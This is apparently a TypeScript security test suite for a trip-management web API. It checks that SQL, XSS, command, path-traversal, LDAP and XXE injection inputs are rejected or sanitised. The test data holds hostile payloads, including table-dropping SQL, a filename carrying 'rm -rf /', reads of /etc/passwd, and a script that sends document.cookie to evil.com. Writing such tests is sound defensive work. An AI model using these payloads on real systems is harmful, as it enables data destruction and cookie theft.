import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import { setupTestApp } from '@/test/helpers/testApp';
import { getDatabase } from '@/config/database';
import { Knex } from 'knex';
import jwt from 'jsonwebtoken';

describe('Injection Security Tests', () => {
    let app: any;
    let db: Knex;
    let userToken: string;

    beforeEach(async () => {
        app = await setupTestApp();
        db = getDatabase();

        // Clean up test data
        await db('users').del();
        await db('trips').del();
        await db('location_points').del();

        // Create test user
        const user = await db('users').insert({
            id: 'test-user',
            email: 'test@example.com',
            role: 'dispatcher',
            status: 'active'
        }).returning('*');

        userToken = jwt.sign(
            { userId: user[0].id, role: user[0].role },
            process.env.JWT_SECRET!,
            { expiresIn: '15m' }
        );
    });

    afterEach(async () => {
        await db('users').del();
        await db('trips').del();
        await db('location_points').del();
    });

    describe('SQL Injection Prevention', () => {
        it('should prevent SQL injection in user search', async () => {
            const maliciousQuery = "'; DROP TABLE users; SELECT * FROM users WHERE email LIKE '%";

            const response = await request(app)
                .get(`/api/users/search?q=${encodeURIComponent(maliciousQuery)}`)
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(200);

            // Verify users table still exists
            const usersExist = await db.schema.hasTable('users');
            expect(usersExist).toBe(true);

            // Verify no users were deleted
            const userCount = await db('users').count('* as count');
            expect(parseInt(userCount[0].count as string)).toBeGreaterThan(0);
        });

        it('should prevent SQL injection in trip filtering', async () => {
            const maliciousFilter = "1=1; DELETE FROM trips; --";

            const response = await request(app)
                .get(`/api/trips?status=${encodeURIComponent(maliciousFilter)}`)
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('VALIDATION_FAILED');
        });

        it('should prevent SQL injection in location queries', async () => {
            const maliciousCoordinate = "14.5995'; DROP TABLE location_points; SELECT '1";

            const response = await request(app)
                .get(`/api/locations/nearby?lat=${maliciousCoordinate}&lng=120.9842&radius=1000`)
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('VALIDATION_FAILED');

            // Verify location_points table still exists
            const tableExists = await db.schema.hasTable('location_points');
            expect(tableExists).toBe(true);
        });

        it('should prevent SQL injection in order by clauses', async () => {
            const maliciousOrderBy = "id; DROP TABLE users; --";

            const response = await request(app)
                .get(`/api/trips?orderBy=${encodeURIComponent(maliciousOrderBy)}`)
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('INVALID_ORDER_BY');
        });

        it('should prevent blind SQL injection through timing attacks', async () => {
            const timingAttack = "1 AND (SELECT COUNT(*) FROM users WHERE email LIKE 'admin%') > 0 AND SLEEP(5)";

            const startTime = Date.now();
            const response = await request(app)
                .get(`/api/users/search?q=${encodeURIComponent(timingAttack)}`)
                .set('Authorization', `Bearer ${userToken}`);
            const endTime = Date.now();

            expect(response.status).toBe(200);
            // Should not take more than 2 seconds (no SLEEP executed)
            expect(endTime - startTime).toBeLessThan(2000);
        });
    });

    describe('XSS Prevention', () => {
        it('should sanitize user input in profile updates', async () => {
            const xssPayload = '<script>alert("XSS")</script>';

            const response = await request(app)
                .put('/api/user/profile')
                .set('Authorization', `Bearer ${userToken}`)
                .send({
                    name: xssPayload,
                    department: 'Engineering'
                });

            expect(response.status).toBe(200);

            // Verify script tags are escaped or removed
            const user = await db('users').where('id', 'test-user').first();
            expect(user.name).not.toContain('<script>');
            expect(user.name).not.toContain('alert(');
        });

        it('should prevent XSS in trip comments', async () => {
            const trip = await db('trips').insert({
                id: 'test-trip',
                route_id: 'test-route',
                status: 'planned',
                planned_stops: '[]',
                created_at: new Date(),
                scheduled_at: new Date()
            }).returning('*');

            const xssPayload = '<img src="x" onerror="alert(\'XSS\')">';

            const response = await request(app)
                .post(`/api/trips/${trip[0].id}/comments`)
                .set('Authorization', `Bearer ${userToken}`)
                .send({
                    comment: xssPayload
                });

            expect(response.status).toBe(201);

            // Verify XSS payload is sanitized
            expect(response.body.comment).not.toContain('onerror');
            expect(response.body.comment).not.toContain('alert');
        });

        it('should prevent XSS in search results', async () => {
            // Create user with malicious name
            await db('users').insert({
                id: 'malicious-user',
                email: 'malicious@example.com',
                name: '<script>document.location="http://evil.com"</script>',
                role: 'worker',
                status: 'active'
            });

            const response = await request(app)
                .get('/api/users/search?q=malicious')
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(200);

            // Verify script is escaped in response
            const user = response.body.users.find((u: any) => u.id === 'malicious-user');
            expect(user.name).not.toContain('<script>');
            expect(user.name).not.toContain('document.location');
        });

        it('should prevent stored XSS in audit logs', async () => {
            const xssPayload = '"><script>fetch("http://evil.com/steal?data="+document.cookie)</script>';

            const response = await request(app)
                .post('/api/trips')
                .set('Authorization', `Bearer ${userToken}`)
                .send({
                    routeId: 'test-route',
                    scheduledAt: new Date().toISOString(),
                    notes: xssPayload
                });

            expect(response.status).toBe(201);

            // Check audit log entry
            const auditResponse = await request(app)
                .get('/api/audit/events?entityType=trip')
                .set('Authorization', `Bearer ${userToken}`);

            expect(auditResponse.status).toBe(200);

            // Verify XSS is not present in audit logs
            const auditEvent = auditResponse.body.events[0];
            expect(JSON.stringify(auditEvent)).not.toContain('<script>');
            expect(JSON.stringify(auditEvent)).not.toContain('fetch(');
        });
    });

    describe('Command Injection Prevention', () => {
        it('should prevent command injection in file operations', async () => {
            const maliciousFilename = 'report.pdf; rm -rf /; echo "pwned"';

            const response = await request(app)
                .post('/api/reports/generate')
                .set('Authorization', `Bearer ${userToken}`)
                .send({
                    type: 'usage',
                    filename: maliciousFilename,
                    format: 'pdf'
                });

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('INVALID_FILENAME');
        });

        it('should prevent command injection in export operations', async () => {
            const maliciousPath = '../../../etc/passwd';

            const response = await request(app)
                .get(`/api/data/export?path=${encodeURIComponent(maliciousPath)}`)
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('INVALID_PATH');
        });
    });

    describe('LDAP Injection Prevention', () => {
        it('should prevent LDAP injection in user lookup', async () => {
            const ldapInjection = 'admin)(|(password=*))(&(cn=';

            const response = await request(app)
                .get(`/api/users/ldap-lookup?username=${encodeURIComponent(ldapInjection)}`)
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('VALIDATION_FAILED');
        });
    });

    describe('XML Injection Prevention', () => {
        it('should prevent XXE attacks in XML uploads', async () => {
            const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>`;

            const response = await request(app)
                .post('/api/data/import')
                .set('Authorization', `Bearer ${userToken}`)
                .set('Content-Type', 'application/xml')
                .send(xxePayload);

            expect(response.status).toBe(400);
            expect(response.body.error.code).toBe('INVALID_XML');
        });
    });
});